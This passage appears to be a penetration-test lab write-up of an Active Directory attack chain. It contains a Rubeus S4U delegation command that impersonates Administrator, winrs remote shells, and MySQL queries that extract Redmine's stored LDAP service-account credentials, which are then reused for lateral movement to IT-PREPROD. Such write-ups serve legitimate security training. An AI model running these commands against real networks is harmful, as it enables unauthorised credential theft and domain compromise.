```powershell
# FROM IT-EMPLOYEE15 (RBCD)
.\Rubeus.exe s4u /user:it-attack01$ /rc4:REDACTED_SECRET /msdsspn:HTTP/it-track01.it.gcb.example /impersonateuser:Administrator /ptt

winrs.exe -r:it-track01.it.gcb.example cmd
```

> The `Administrator.IT` profile directory corresponds to the domain user `IT\Administrator`. Because a local `Administrator` profile already exists on the system, Windows appends the `.IT` suffix (domain NetBIOS name) to distinguish the domain account profile — access here is limited to local administrator on this host.

## ATTACK CHAIN

`Host (Bitnami Stack)` → `C:\Bitnami` installation identified → web services enumerated (Apache/MySQL/PHP) → configuration files reviewed (`httpd.conf`, `my.ini`, `.env`) → cleartext credentials recovered → internal service access → credential reuse → lateral movement to `10.200.9.41 ~ IT-PREPROD`

## EXPLOITATION

During host enumeration, a Bitnami Redmine installation was identified at `C:\Bitnami`. This type of application commonly stores external authentication configurations (e.g., LDAP/Active Directory) in its database — a valuable source of reusable credentials.

The MySQL database bundled with the Bitnami stack was accessed. The root MySQL password (`REDACTED_SECRET`) was previously recovered from `IT-EMPLOYEE15` via mimikatz `vault:REDACTED_SECRET`.

#### Access the Redmine Database

```powershell
cd C:\Bitnami\redmine-4.0.3-3\mysql\bin
.\mysql.exe -u"root" -p"REDACTED_SECRET" -e "SHOW DATABASES;"
.\mysql.exe -u"root" -p"REDACTED_SECRET" -e "USE bitnami_redmine; SHOW TABLES;"
.\mysql.exe -u"root" -p"REDACTED_SECRET" -e "use bitnami_redmine; select * from auth_sources\G;"
```

The LDAP authentication configuration used by Redmine was exposed:

```powershell
*************************** 1. row ***************************
               id: 1
             type: AuthSourceLdap
             name: itdc
             host: it-dc
             port: 389
          account: it\ldapintegration
 account_password: REDACTED_SECRET
          base_dn: cn=Users,dc=it,dc=gcb,dc=local
       attr_login: sAMAccountName
```

The `it\ldapintegration` account credentials were recovered in cleartext — used by the application to authenticate against Active Directory.

#### Active Directory Impact

`ldapintegration` is a member of `IT\Services`. This group is defined in the `PreProd` GPO via Restricted Groups, which automatically adds its members to the local Administrators group on hosts within the `PreProd` OU. Any member of `IT\Services` therefore gains local administrator privileges on systems subject to that policy — in this environment, specifically `IT-PREPROD`.

#### Connect to IT-PREPROD

```powershell
# FROM IT-EMPLOYEE15
winrs.exe -r:IT-PREPROD -u:ldapintegration -p:"REDACTED_SECRET" cmd
```

> No directly exploitable ACLs, unsafe delegations, or write permissions over AD objects were identified for the `ldapintegration` identity. No direct privilege escalation paths or writable sensitive domain objects were found.
